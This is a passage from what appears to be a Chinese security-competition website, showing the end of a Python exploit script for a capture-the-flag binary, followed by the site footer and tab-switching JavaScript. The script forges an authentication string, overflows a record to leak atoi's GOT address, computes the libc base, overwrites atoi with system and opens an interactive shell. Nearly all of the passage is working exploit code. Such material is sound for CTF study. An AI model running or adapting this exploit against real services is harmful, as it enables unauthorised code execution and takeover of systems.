&nbsp;&nbsp;&nbsp;&nbsp;delete_record(io,&nbsp;"2"*0x10,&nbsp;passwd&nbsp;+&nbsp;"\n")&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;#t_auth&nbsp;=&nbsp;"1"*((0x78-1)*4/3&nbsp;+&nbsp;1)&nbsp;+&nbsp;l8(0xff)&nbsp;+&nbsp;"\x00\n"
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;target_len&nbsp;=&nbsp;0x58
&nbsp;&nbsp;&nbsp;&nbsp;t_auth&nbsp;=&nbsp;""
&nbsp;&nbsp;&nbsp;&nbsp;t_auth&nbsp;+=&nbsp;"@@@"*(target_len/3)
&nbsp;&nbsp;&nbsp;&nbsp;t_auth&nbsp;+=&nbsp;"@"*(target_len%3)&nbsp;+&nbsp;'\x31'
&nbsp;&nbsp;&nbsp;&nbsp;t_auth&nbsp;=&nbsp;t_auth.encode("base64").replace("\n",&nbsp;"")
&nbsp;&nbsp;&nbsp;&nbsp;t_auth&nbsp;=&nbsp;t_auth[:-1]&nbsp;+&nbsp;"\x00\n"

&nbsp;&nbsp;&nbsp;&nbsp;#io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;add_record(io,&nbsp;"2"*0x10,&nbsp;t_auth,&nbsp;0x20-1,&nbsp;"padding\n")&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#io.gdb_hint()

&nbsp;&nbsp;&nbsp;&nbsp;atoi_got&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0x0000000000602090
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;offset_atoi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0x36e80
&nbsp;&nbsp;&nbsp;&nbsp;offset_system&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0x45390

&nbsp;&nbsp;&nbsp;&nbsp;full_addr&nbsp;=&nbsp;0x4019DA&nbsp;#full
&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;""
&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;'a'*0x100
&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;'2'*0x10
&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;l64(full_addr)
&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;l64(atoi_got)
&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;l32(0x100)&nbsp;+&nbsp;l32(0x1)[:-1]#&nbsp;+&nbsp;"\n"

&nbsp;&nbsp;&nbsp;&nbsp;#io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;edit_record(io,&nbsp;"3"*0x10,&nbsp;passwd&nbsp;+&nbsp;"\n",&nbsp;0x128&nbsp;-&nbsp;1,&nbsp;payload)

&nbsp;&nbsp;&nbsp;&nbsp;passwd_new&nbsp;=&nbsp;"full\x00".encode("base64")
&nbsp;&nbsp;&nbsp;&nbsp;io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;show_record(io,&nbsp;"2"*0x10,&nbsp;passwd_new&nbsp;+&nbsp;"\n")
&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;io.read_until("\n")[:-1]
&nbsp;&nbsp;&nbsp;&nbsp;atoi_addr&nbsp;=&nbsp;d2v_x64(data)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;"atoi_addr:",&nbsp;hex(atoi_addr)
&nbsp;&nbsp;&nbsp;&nbsp;io.gdb_hint()

&nbsp;&nbsp;&nbsp;&nbsp;leak_addr&nbsp;=&nbsp;atoi_addr
&nbsp;&nbsp;&nbsp;&nbsp;leak_offset&nbsp;=&nbsp;offset_atoi
&nbsp;&nbsp;&nbsp;&nbsp;libc_base&nbsp;=&nbsp;leak_addr&nbsp;-&nbsp;leak_offset
&nbsp;&nbsp;&nbsp;&nbsp;system_addr&nbsp;=&nbsp;libc_base&nbsp;+&nbsp;offset_system

&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;""
&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;l64(system_addr)

&nbsp;&nbsp;&nbsp;&nbsp;edit_record(io,&nbsp;"2"*0x10,&nbsp;passwd_new&nbsp;+&nbsp;"\n",&nbsp;0x10,&nbsp;payload)

&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_str(io,&nbsp;"&gt;&nbsp;",&nbsp;"sh\n")&nbsp;&nbsp;&nbsp;&nbsp;#io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;io.interact()&nbsp;&nbsp;&nbsp;&nbsp;pass&nbsp;&nbsp;&nbsp;&nbsp;io&nbsp;=&nbsp;get_io(target)
pwn(io)</pre><p><br></p>
     
    </div>
    
     
    
  </div>
 
 <!--include file="right.asp"-->
  
</div>
 
<div class="footer">
  <div class="menu">
    <ul>
      <li><a href="http://www.sdnisc.cn/">首页</a></li>
      <!--<li><a href="present_292_297.html">关于我们</a></li>-->
      <li><a href="http://www.sdnisc.cn/present_261_268.html">参赛介绍</a></li>
      <li><a href="http://www.sdnisc.cn/spedetail_245_250.html">参赛指南</a></li>
      <li><a href="http://www.sdnisc.cn/present_294_295.html">联系我们</a></li>
    </ul>
  </div>
  <div class="cpy">
		  <p style=";text-align:left;line-height:150%"><span style="font-size: 16px; font-family: 等线;"></span></p><p><span style="font-size: 16px; font-family: 等线;"></span></p><p style="text-align: center;"><span style="font-family: 等线; font-size: 16px;">主办单位：山东省委网信办、共青团山东省委、山东省发展改革委、山东省教育厅、山东省公安厅、山东省国家安全厅、山东省通信管理局、山东省学生联合会</span></p><p style="text-align: center;"><span style="font-family: 等线; font-size: 16px;">承办单位：山东信息协会、山东政法学院、国家计算机网络与信息安全管理中心山东分中心、山东省社会信用中心</span></p><p style="text-align: center;"><span style="font-size: 16px; font-family: 等线;">&nbsp;协办单位：中国网安•成都深思科技有限公司、山东九州信息安全研究院、北京同天科技有限公司、山东华炬教育科技有限公司、山东云天安全技术有限公司</span></p><p style="text-align: center;"><span style="font-family: 等线; font-size: 16px;">网站技术支持单位：山东金桥网络技术有限责任公司</span></p><p>copyright@2016 <span style="COLOR: rgb(0,112,192)">鲁ICP备12010083号</span></p><p><span style="COLOR: rgb(0,112,192)"><br></span></p>
  </div>
</div>
<script type="text/javascript">
function setTab(name,cursel){
	cursel_0=cursel;
	for(var i=1; i<=links_len; i++){
		var menu = document.getElementById(name+i);
		var menudiv = document.getElementById("con_"+name+"_"+i);
		if(i==cursel){
			menu.className="off";
			menudiv.style.display="block";
		}
		else{
			menu.className="";
			menudiv.style.display="none";
		}
	}
}
function Next(){                                                        
	cursel_0++;
	if (cursel_0>links_len)cursel_0=1
	setTab(name_0,cursel_0);
} 
var name_0='one';
var cursel_0=1;
//var ScrollTime=3000;//循环周期（毫秒）
var links_len,iIntervalId;
onload=function(){
	var links = document.getElementById("tab1").getElementsByTagName('li')
	links_len=links.length;
	for(var i=0; i<links_len; i++){
		links[i].onmouseover=function(){
			clearInterval(iIntervalId);
			this.onmouseout=function(){
				iIntervalId = setInterval(Next,ScrollTime);;
			}
		}
	}
	document.getElementById("con_"+name_0+"_"+links_len).parentNode.onmouseover=function(){
		clearInterval(iIntervalId);
		this.onmouseout=function(){
			iIntervalId = setInterval(Next,ScrollTime);;
		}
	}
	setTab(name_0,cursel_0);
	iIntervalId = setInterval(Next,ScrollTime);
}
</script>


</body></html>